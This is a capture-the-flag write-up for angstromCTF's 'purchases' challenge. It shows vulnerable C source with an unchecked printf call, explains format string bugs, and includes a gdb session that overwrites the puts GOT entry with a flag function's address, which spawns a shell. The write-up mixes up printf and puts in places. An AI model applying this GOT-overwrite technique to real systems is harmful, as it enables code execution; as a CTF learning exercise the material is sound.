## angstromCTF: purchases
>This grumpy shop owner won't sell me his flag! At least I have his source.

##### *tl;dr: format string vulnerability to overwrite printf GOT*
#### As with the other pwn challenges, the source codes are given - making the vulnerability finding process much easier:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	char item[60];
	printf("What item would you like to purchase? ");
	fgets(item, sizeof(item), stdin);
	item[strlen(item)-1] = 0;

	if (strcmp(item, "nothing") == 0) {
		printf("Then why did you even come here? ");
	} else {
		printf("You don't have any money to buy ");
		printf(item);
		printf("s. You're wasting your time! We don't even sell ");
		printf(item);
		printf("s. Leave this place and buy ");
		printf(item);
		printf(" somewhere else. ");
	}

	printf("Get out!\n");
	return 0;
}
```
#### Taking a quick look at the source code, we quickly spot the vulnerability which is the printf function being called without format specifiers (`printf(item);`). What this means is that printf interprets buffer as a format string, and parses any formatting instructions it may contain - thus leading to code executions and memory leaks. 
#### A format string exploit could be executed when the application doesn’t properly validate the submitted input. For example, if a format string parameter, like %x, is inserted into the posted data, the string is parsed by the format function, and the conversion specified in the parameters is executed. However, the format function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack. 
#### To have a better understanding of how we will exploit this challenge, here are quick links to `LiveOverflow`'s videos on format string exploitation:
> [A simple Format String exploit example - bin 0x11](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18)

> [Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin 0x12](https://www.youtube.com/watch?v=kUk5pw4w0h4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=19)

> [Format String Exploit and overwrite the Global Offset Table - bin 0x13](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20)

> [Adapting the 32bit exploit to 64bit for format4 - bin 0x27](https://www.youtube.com/watch?v=_lO_rwaK_pY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=42)

#### Examining the source code again, we see that there is is a flag function which prints out the flag for us. Taking a note of this, our exploit plan will be to take advantage of the format string vulnerability to overwrite puts' `GOT address` to the flag function - thus making puts execute what flag does. To test if our plan would work, we try it out in gdb. We set a breakpoint before the puts call, then change the it's GOT address to the address of flag:
```
$ gdb ./purchases
	gdb-peda$ disas printf
	Dump of assembler code for function puts@plt:
    0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018
    0x0000000000401036 <+6>:	push   0x0
    0x000000000040103b <+11>:	jmp    0x401020
	End of assembler dump..
	
	gdb-peda$ p flag
	$1 = {<text variable, no debug info>} 0x4011b6 <flag>
	
	gdb-peda$ disas main
	  [...]
    0x000000000040131a <+337>:	call   0x401080 <printf@plt>
    0x000000000040131f <+342>:	lea    rdi,[rip+0xdda]        # 0x402100
    0x0000000000401326 <+349>:	call   0x401030 <puts@plt>
    0x000000000040132b <+354>:	mov    eax,0x0
	  [...]
	
	gdb-peda$ break *0x0000000000401326
	Breakpoint 1 at 0x401326
	
	gdb-peda$ r
	What item would you like to purchase? everything
	You don't have any money to buy everythings. You're wasting your time! We don't even sell everythings. Leave this place and buy everything somewhere else. 
	Breakpoint 1, 0x0000000000401326 in main ()
	
	gdb-peda$ set {int}0x404018=0x4011b6
	
	gdb-peda$ x/ 0x404018
	0x404018:	0x00000000004011b6
	
	gdb-peda$ c
	Continuing.
	[New process 11726]
	process 11726 is executing new program: /bin/dash
	Warning:
	Cannot insert breakpoint 1.
	Cannot access memory at address 0x401326
```


